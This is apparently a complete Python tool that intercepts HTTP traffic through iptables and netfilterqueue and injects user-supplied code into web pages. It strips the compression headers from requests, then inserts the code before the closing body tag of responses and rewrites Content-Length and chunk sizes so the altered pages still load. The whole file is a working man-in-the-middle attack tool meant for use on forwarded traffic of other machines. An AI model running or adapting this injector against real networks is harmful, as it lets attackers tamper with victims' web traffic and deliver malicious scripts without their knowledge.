import netfilterqueue
import subprocess
from scapy.all import Raw
from scapy.layers.inet import IP, TCP
import argparse
import re
import sys
import traceback


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-m", "--machine", dest="machine", help="Machine to execute command on (local/remote)")
    parser.add_argument("-i", "--inject", dest="inject", help="Injection code to execute")
    args = parser.parse_args()

    if not args.machine or args.machine not in ["local", "remote"]:
        parser.error("[-] Invalid input; Please specify a machine; Use -h or --help for more info")
    if not args.inject:
        parser.error("[-] Invalid input; Please specify a code to inject; Use -h or --help for more info")
    return args


def set_iptables_rule(machine):
    if machine == "local":
        values = ["OUTPUT", "INPUT"]
    elif machine == "remote":
        values = ["FORWARD"]
    else:
        raise ValueError("Invalid machine type")

    for iptables_cmd in values:
        subprocess.call(["sudo", "iptables", "-I", iptables_cmd, "-j", "NFQUEUE", "--queue-num", "0"])
    print("[+] Setting iptables for {} machine".format(machine))


def set_load(packet, load):
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    packet[Raw].load = load
    return packet


def process_packets(packet):
    try:
        scapy_packet = IP(packet.get_payload())

        if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
            load = scapy_packet[Raw].load
            if scapy_packet[TCP].dport == 80:
                load = re.sub(b"(?:Accept-Encoding|Upgrade-Insecure-Requests|grade-Insecure-Requests):.*?\r\n",
                              b"", load)
                if scapy_packet[TCP].ack not in req_ack:
                    req_ack.append(scapy_packet[TCP].ack)
                modified_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(modified_packet))
                packet.accept()
                print("[+] REQUEST")

            if scapy_packet[TCP].sport == 80:
                print("[+] RESPONSE")
                injection_code = b"\n" + arguments.inject.encode(errors="ignore") + b"\n"
                injection_code_length = len(injection_code)

                if load and scapy_packet[TCP].seq in req_ack and b'200 OK' in load and b'Content-Length' in load:
                    load = modify_content_length(load, injection_code)
                    modified_packet = set_load(scapy_packet, load)
                    packet.set_payload(bytes(modified_packet))
                    packet.accept()
                    req_ack.remove(scapy_packet[TCP].seq)

                elif load and scapy_packet[TCP].seq in req_ack and b'200 OK' in load and b'Transfer-Encoding: chunked' in load:
                    find_chunk = load.find(b'\r\n\r\n')
                    chunk_start = load[find_chunk + len(b'\r\n\r\n'):]
                    chunk_data_start = chunk_start.find(b'\r\n')
                    hex_data = chunk_start[:chunk_data_start]
                    hex_data_value = int(hex_data, 16)
                    hex_data_value = hex_data_value + injection_code_length
                    hex_data_value = hex(hex_data_value)[2:].encode(errors="ignore")
                    load = load.replace(hex_data, hex_data_value)
                    res_ack.append(scapy_packet[TCP].ack)
                    req_ack.remove(scapy_packet[TCP].seq)
                    modified_packet = set_load(scapy_packet, load)
                    packet.set_payload(bytes(modified_packet))
                    packet.accept()

                elif load and scapy_packet[TCP].ack in res_ack and b'\n\r\n0\r\n\r\n' not in load:
                    modified_packet = set_load(scapy_packet, load)
                    packet.set_payload(bytes(modified_packet))
                    packet.accept()

                elif load and scapy_packet[TCP].ack in res_ack and b'\n\r\n0\r\n\r\n' in load:
                    load = load.replace(b'</body>', injection_code + b"</body>")
                    modified_packet = set_load(scapy_packet, load)
                    packet.set_payload(bytes(modified_packet))
                    packet.accept()

                else:
                    packet.accept()

        else:
            packet.accept()

    except Exception as e:
        handle_exception(e)


def modify_content_length(load, injection_code):
    if load:
        content_length_search = re.search(b"Content-Length:\s(\d*)", load)
        if content_length_search and b"text/html" in load:
            load = load.replace(b"</body>", injection_code + b"</body>")
            content_length = content_length_search.group(1)
            new_content_length = str(int(content_length) + len(injection_code)).encode(errors="ignore")
            load = load.replace(content_length, new_content_length)
            return load
        else:
            return load
    return load


def queue_packets():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packets)
    print("\n[+] Starting code injector")
    set_iptables_rule(arguments.machine)
    print("[+] Code injector started successfully!\n")
    try:
        queue.run()
    except KeyboardInterrupt:
        print("\n\n[-] Closing code injector")
    finally:
        cleanup()


def handle_exception(exception):
    print("\n\n[!] An error occurred: ", str(exception) + "\n\n")
    traceback.print_exc()
    print("\n\n[-] Terminating session")
    sys.exit(1)


def cleanup():
    subprocess.call(["sudo", "iptables", "--flush"])
    print("[-] Flushing iptables")
    print("[-] Code injector ended successfully!")


buffer_chunks_list = []
req_ack = []
res_seq = []
res_ack = []
given_chunks_hex = []
arguments = get_arguments()
queue_packets()
